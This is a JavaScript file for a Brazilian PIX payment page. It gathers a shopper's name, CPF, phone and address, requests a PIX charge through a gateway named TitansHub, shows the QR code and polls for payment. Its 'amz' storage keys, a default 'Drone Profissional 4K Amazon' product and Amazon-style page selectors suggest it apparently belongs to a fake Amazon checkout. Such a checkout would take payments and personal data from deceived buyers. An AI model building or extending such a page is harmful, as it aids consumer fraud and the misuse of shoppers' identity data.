/**
 * PIX payment manager for the QR page.
 * Uses the real TitansHub transaction response for both the QR code and the copy/paste key.
 */
class PixUIManager {
  constructor() {
    this.config = {
      pageId: "checkout_5",
      createUrl: "/api/pix/create",
      statusUrl: "/api/pix/status/",
      pollInterval: 5000,
      successRedirect: "success.html",
    };
    this.state = null;
    this.transaction = null;
    this.statusInterval = null;
    this.isChecking = false;
  }

  toCents(value) {
    if (value === null || value === undefined || value === "") return 0;
    if (typeof value === "number") {
      if (!Number.isFinite(value)) return 0;
      if (Number.isInteger(value) && Math.abs(value) >= 1000) return value;
      return Math.round(value * 100);
    }
    const text = String(value).trim();
    if (!text) return 0;
    if (/^-?\d+$/.test(text)) {
      const numeric = Number(text);
      if (Math.abs(numeric) >= 1000) return numeric;
      return Math.round(numeric * 100);
    }
    const normalized = text
      .replace(/[^\d,.-]/g, "")
      .replace(/\.(?=\d{3}(?:\D|$))/g, "")
      .replace(",", ".");
    const parsed = Number(normalized);
    return Number.isFinite(parsed) ? Math.round(parsed * 100) : 0;
  }

  readStoredValue(key) {
    const sessionValue = sessionStorage.getItem(key);
    if (sessionValue) return sessionValue;

    try {
      return localStorage.getItem(key);
    } catch (error) {
      return null;
    }
  }

  readStoredJson(key) {
    try {
      return JSON.parse(this.readStoredValue(key) || "{}") || {};
    } catch (error) {
      return {};
    }
  }

  extractPixCode(transaction) {
    const safe = transaction || {};
    return (
      (safe.pix &&
        (safe.pix.qrcode ||
          safe.pix.qrCode ||
          safe.pix.copyPaste ||
          safe.pix.code)) ||
      safe.pix_code ||
      safe.qrcode ||
      safe.qrCode ||
      safe.copyPaste ||
      (safe.paymentMethodData &&
        safe.paymentMethodData.pix &&
        (safe.paymentMethodData.pix.qrcode ||
          safe.paymentMethodData.pix.qrCode ||
          safe.paymentMethodData.pix.copyPaste ||
          safe.paymentMethodData.pix.code)) ||
      ""
    );
  }

  extractPixQrImage(transaction) {
    const safe = transaction || {};
    const candidate =
      (safe.pix &&
        (safe.pix.qrcodeImage ||
          safe.pix.qrCodeImage ||
          safe.pix.qrcodeBase64 ||
          safe.pix.qrCodeBase64 ||
          safe.pix.image ||
          safe.pix.imageUrl)) ||
      safe.qrcodeImage ||
      safe.qrCodeImage ||
      safe.qrcodeBase64 ||
      safe.qrCodeBase64 ||
      safe.qrcodeUrl ||
      safe.qrCodeUrl ||
      "";

    if (!candidate) {
      return "";
    }

    if (/^data:image\//i.test(candidate) || /^https?:\/\//i.test(candidate)) {
      return candidate;
    }

    if (/^[A-Za-z0-9+/=]+$/.test(candidate)) {
      return `data:image/png;base64,${candidate}`;
    }

    return "";
  }

  formatCurrencyFromCents(amountCents) {
    const numeric = Number(amountCents) || 0;
    return (numeric / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    });
  }

  restoreAmountHeading() {
    const heading = document.querySelector('h1[data-testid="heading"]');
    if (!heading) {
      return;
    }

    const buyer = this.buildBuyerPayload();
    const amountCents =
      this.toCents(buyer.amountCents) ||
      this.toCents(this.state && this.state.amountCents) ||
      this.toCents(this.state && this.state.amount) ||
      this.toCents(this.state && this.state.totalAmount) ||
      this.toCents(this.transaction && this.transaction.amount);

    heading.textContent = amountCents
      ? `Total a pagar: ${this.formatCurrencyFromCents(amountCents)}`
      : "Total a pagar:";
    heading.style.color = "rgb(15,17,17)";
  }

  buildBuyerPayload() {
    const base = this.state && typeof this.state === "object"
      ? (this.state.buyer || this.state)
      : {};
    const storedAddress = this.readStoredJson("checkout_address");
    const storedName = this.readStoredValue("user_name") || "";
    const storedFullAddress = this.readStoredValue("user_full_address") || "";
    const rawWhole = this.readStoredValue("checkout_price_whole") || "";
    const rawFraction = this.readStoredValue("checkout_price_fraction") || "";
    const rawAmount = this.readStoredValue("amz_total_amount") || "";

    const merged = Object.assign({}, storedAddress, base, {
      nome: (base.nome || base.name || storedName || storedAddress.nome || "").trim(),
      name: (base.name || base.nome || storedName || storedAddress.nome || "").trim(),
      cpf: String(base.cpf || storedAddress.cpf || "").replace(/\D/g, ""),
      email: String(base.email || "").trim(),
      phone: String(base.phone || base.telefone || storedAddress.telefone || "").replace(/\D/g, ""),
      telefone: String(base.telefone || base.phone || storedAddress.telefone || "").replace(/\D/g, ""),
      zipCode: String(base.zipCode || base.cep || storedAddress.cep || "").replace(/\D/g, ""),
      cep: String(base.cep || base.zipCode || storedAddress.cep || "").replace(/\D/g, ""),
      street: String(base.street || base.rua || storedAddress.rua || "").trim(),
      rua: String(base.rua || base.street || storedAddress.rua || "").trim(),
      number: String(base.number || base.numero || storedAddress.numero || "").trim(),
      numero: String(base.numero || base.number || storedAddress.numero || "").trim(),
      complement: String(base.complement || base.complemento || storedAddress.complemento || "").trim(),
      complemento: String(base.complemento || base.complement || storedAddress.complemento || "").trim(),
      neighborhood: String(base.neighborhood || base.bairro || storedAddress.bairro || "").trim(),
      bairro: String(base.bairro || base.neighborhood || storedAddress.bairro || "").trim(),
      city: String(base.city || base.cidade || storedAddress.cidade || "").trim(),
      cidade: String(base.cidade || base.city || storedAddress.cidade || "").trim(),
      state: String(base.state || base.estado || storedAddress.estado || "").trim(),
      estado: String(base.estado || base.state || storedAddress.estado || "").trim(),
      fullAddress: String(base.fullAddress || base.full_address || storedFullAddress || storedAddress.full_address || "").trim(),
      full_address: String(base.full_address || base.fullAddress || storedFullAddress || storedAddress.full_address || "").trim(),
      productName: String(base.productName || base.product_name || "").trim(),
    });

    const resolvedAmountCents =
      this.toCents(base.amountCents) ||
      this.toCents(base.amount) ||
      this.toCents(base.totalAmount) ||
      this.toCents(`${rawWhole},${rawFraction}`) ||
      this.toCents(rawAmount);

    merged.amountCents = resolvedAmountCents;
    merged.amount = resolvedAmountCents / 100;
    merged.totalAmount = resolvedAmountCents / 100;

    return merged;
  }

  resolveItems(amountCents, buyer) {
    const title =
      (buyer && buyer.productName) ||
      (this.state && (this.state.productName || this.state.product_name)) ||
      "Drone Profissional 4K Amazon";

    return [
      {
        title,
        unitPrice: amountCents,
        quantity: 1,
        tangible: true,
      },
    ];
  }

  async init() {
    const bridge = window.__amzBridge;

    if (bridge && bridge.init) {
      this.state = await bridge.init(this.config.pageId);
    } else if (bridge && bridge.getState) {
      this.state = await bridge.getState();
    }

    if (!this.state || !this.state.attribution_id) {
      this.showError("Não foi possível carregar os dados do pedido.");
      return;
    }

    if (this.state.matched_event_object_id) {
      await this.checkStatus(this.state.matched_event_object_id);
    } else {
      await this.createTransaction();
    }

    this.setupEventListeners();
  }

  async createTransaction() {
    try {
      const buyer = this.buildBuyerPayload();
      const amountCents =
        this.toCents(buyer.amountCents) ||
        this.toCents(this.state.amountCents) ||
        this.toCents(this.state.amount) ||
        this.toCents(this.state.totalAmount) ||
        0;

      if (!amountCents || !buyer.name || !buyer.cpf) {
        this.showError("Dados do cliente incompletos para gerar o PIX.");
        return;
      }

      const response = await fetch(this.config.createUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          attributionId: this.state.attribution_id,
          sessionId: this.state.session_id,
          pageId: this.config.pageId,
          amount: amountCents,
          buyer,
          items: this.resolveItems(amountCents, buyer),
          landingPage: this.state.landing_page || this.state.landingPage || "",
          pageUrl: window.location.href,
        }),
      });

      const result = await response.json();
      if (result.ok && result.transaction) {
        this.transaction = result.transaction;
        if (result.state) {
          this.state = result.state;
        }
        this.renderUI(result.transaction);
        if (result.transaction.id) {
          this.startPolling(result.transaction.id);
        }
      } else {
        this.showError("Erro ao gerar PIX: " + (result.message || "Erro desconhecido"));
      }
    } catch (error) {
      console.error("PixUIManager createTransaction error:", error);
      this.showError("Erro de conexão ao gerar o PIX.");
    }
  }

  async checkStatus(txId) {
    if (this.isChecking || !txId) return;
    this.isChecking = true;

    try {
      const response = await fetch(this.config.statusUrl + encodeURIComponent(txId), {
        cache: "no-store",
      });
      const result = await response.json();

      if (result.ok) {
        const status = String(result.status || "").toLowerCase();
        if (["paid", "approved", "confirmed", "completed"].includes(status)) {
          this.stopPolling();
          window.location.href = this.config.successRedirect;
          return;
        }

        if (result.transaction) {
          const mergedTransaction = Object.assign({}, this.transaction || {}, result.transaction);
          this.transaction = mergedTransaction;
          this.renderUI(mergedTransaction);
          this.startPolling(txId);
        }
      }
    } catch (error) {
      console.error("PixUIManager checkStatus error:", error);
    } finally {
      this.isChecking = false;
    }
  }

  startPolling(txId) {
    if (this.statusInterval || !txId) return;
    this.statusInterval = setInterval(() => this.checkStatus(txId), this.config.pollInterval);
  }

  stopPolling() {
    if (this.statusInterval) {
      clearInterval(this.statusInterval);
      this.statusInterval = null;
    }
  }

  renderUI(transaction) {
    const mergedTransaction = Object.assign({}, this.transaction || {}, transaction || {});
    this.transaction = mergedTransaction;

    const storedPixCode = this.readStoredValue("checkout_pix_code") || "";
    const pixCode = this.extractPixCode(mergedTransaction) || storedPixCode;
    const qrImage = this.extractPixQrImage(mergedTransaction);
    if (!pixCode && !qrImage) {
      this.showError("Código PIX não recebido da TitansHub.");
      return;
    }

    if (pixCode) {
      sessionStorage.setItem("checkout_pix_code", pixCode);
    }

    const qrContainer = document.getElementById("pix-qrcode-container");
    if (qrContainer) {
      qrContainer.innerHTML = "";

      if (qrImage) {
        const image = document.createElement("img");
        image.src = qrImage;
        image.alt = "QR Code PIX";
        image.style.width = "200px";
        image.style.height = "200px";
        image.style.objectFit = "contain";
        image.style.margin = "auto";
        qrContainer.appendChild(image);
      } else if (pixCode && window.QRCode) {
        new QRCode(qrContainer, {
          text: pixCode,
          width: 200,
          height: 200,
          colorDark: "#000000",
          colorLight: "#ffffff",
          correctLevel: QRCode.CorrectLevel.H,
        });

        const image = qrContainer.querySelector("img");
        if (image) {
          image.style.margin = "auto";
        }
      }
    }

    const copyBtn = document.querySelector('[data-testid="Upx-Prepare-PrimaryButton"]');
    if (copyBtn) {
      copyBtn.onclick = (event) => {
        event.preventDefault();
        this.copyToClipboard(pixCode, copyBtn);
      };
    }

    this.restoreAmountHeading();
  }

  setupEventListeners() {
    const checkBtn = document.getElementById("check-payment-btn");
    if (!checkBtn) return;

    checkBtn.onclick = async (event) => {
      event.preventDefault();
      checkBtn.textContent = "Verificando...";
      checkBtn.disabled = true;

      const txId =
        (this.transaction && this.transaction.id) || this.state.matched_event_object_id;
      await this.checkStatus(txId);

      setTimeout(() => {
        checkBtn.textContent = "Já paguei";
        checkBtn.disabled = false;
      }, 1500);
    };
  }

  copyToClipboard(text, button) {
    if (!text) {
      alert("Código PIX indisponível no momento.");
      return;
    }

    const originalText = button.textContent;
    navigator.clipboard
      .writeText(text)
      .then(() => {
        button.textContent = "Código copiado";
        button.style.backgroundColor = "#007600";
        button.style.color = "#fff";
        setTimeout(() => {
          button.textContent = originalText;
          button.style.backgroundColor = "";
          button.style.color = "";
        }, 2500);
      })
      .catch(() => {
        alert("Falha ao copiar. Copie manualmente.");
      });
  }

  showError(message) {
    const heading = document.querySelector('h1[data-testid="heading"]');
    if (heading) {
      heading.textContent = "Ops! Algo deu errado.";
      heading.style.color = "red";
    }
    console.error("PixUIManager:", message);
  }
}

window.__pixManager = new PixUIManager();
document.addEventListener("DOMContentLoaded", () => window.__pixManager.init());
